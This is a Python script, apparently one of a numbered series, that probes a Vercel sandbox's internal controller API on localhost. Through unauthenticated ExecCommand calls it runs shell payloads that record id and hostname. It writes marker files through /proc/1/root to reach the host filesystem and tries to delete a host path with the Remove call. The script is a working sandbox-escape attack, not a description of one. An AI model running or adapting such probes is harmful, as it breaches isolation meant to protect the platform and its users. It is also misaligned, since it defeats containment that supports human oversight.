# -*- coding: utf-8 -*-
"""v189 阶段A: ExecCommand 真伪判定 - 长进程测试 + 输出文件 + Remove 宿主路径(最后)"""
import socket, json, os, time

OUT = '/vercel/sandbox/v189u.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s, maxlen=2000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def tcp(port, path, body, t=6):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
FS = 'vercel.sandbox.api.controller.v1.FileSystemService'

log('=== 1 ExecCommand long sleep ===')
body = {'command': '/bin/sleep', 'args': ['600'], 'cwd': '/tmp'}
st, pay = tcp(23456, '/' + CTRL + '/ExecCommand', body, t=6)
log('EC sleep -> %s %r' % (st, pay[:400]))
cid = None
try:
    cid = json.loads(pay.split(b'\r\n\r\n', 1)[1].decode(errors='replace')).get('commandId')
    log('CID=%s' % cid)
except Exception as e:
    log('PARSE %s' % e)

time.sleep(2)
log('=== 2 WaitCommand blocking test ===')
if cid:
    st, pay = tcp(23456, '/' + CTRL + '/WaitCommand', {'commandId': cid}, t=5)
    log('WC(t5) -> %s %r' % (st, pay[:400]))
    time.sleep(1)
    st, pay = tcp(23456, '/' + CTRL + '/KillCommand', {'commandId': cid}, t=4)
    log('KC -> %s %r' % (st, pay[:300]))

log('=== 3 user ps ===')
for cmdline in [['ps', '-ef'], ['ps', 'aux']]:
    try:
        r = os.popen(' '.join(cmdline) + ' 2>&1').read()
        log('PS(%s) (%d): %s' % (cmdline[1], len(r), r[:2000]))
    except Exception as e:
        log('PS EXC %s' % e)

log('=== 4 exec write file ===')
marker = 'PWN189_' + str(int(time.time() * 1000))[-8:]
log('MARKER=%s' % marker)
payload = ('echo %s > /tmp/out189.txt 2>&1; id >> /tmp/out189.txt; hostname >> /tmp/out189.txt; '
           'echo X > /vercel/sandbox/out189.txt 2>&1; id >> /vercel/sandbox/out189.txt; '
           'echo Z > /proc/1/root/tmp/out189.txt 2>&1; id >> /proc/1/root/tmp/out189.txt; '
           'echo DONE >> /tmp/out189.txt') % marker
st, pay = tcp(23456, '/' + CTRL + '/ExecCommand', {'command': '/bin/sh', 'args': ['-c', payload]}, t=6)
log('EC write -> %s %r' % (st, pay[:400]))
try:
    cid2 = json.loads(pay.split(b'\r\n\r\n', 1)[1].decode(errors='replace')).get('commandId')
    log('CID2=%s' % cid2)
except Exception:
    pass
time.sleep(2)

log('=== 5 sandbox view ===')
for p in ['/tmp/out189.txt', '/vercel/sandbox/out189.txt', '/proc/1/root/tmp/out189.txt']:
    try:
        d = open(p, 'r', encoding='utf-8', errors='replace').read()
        log('SFILE %s (%d): %r' % (p, len(d), d[:800]))
    except Exception as e:
        log('SFILE %s EXC %s' % (p, e))

log('=== 6 Remove host path (LAST) ===')
for path in ['/proc/1/root/tmp/v189rm.txt']:
    st, pay = tcp(23456, '/' + FS + '/Remove', {'path': path}, t=3)
    log('RM %s -> %s %r' % (path, st, pay[:300]))

log('V189U_DONE')
f.close()
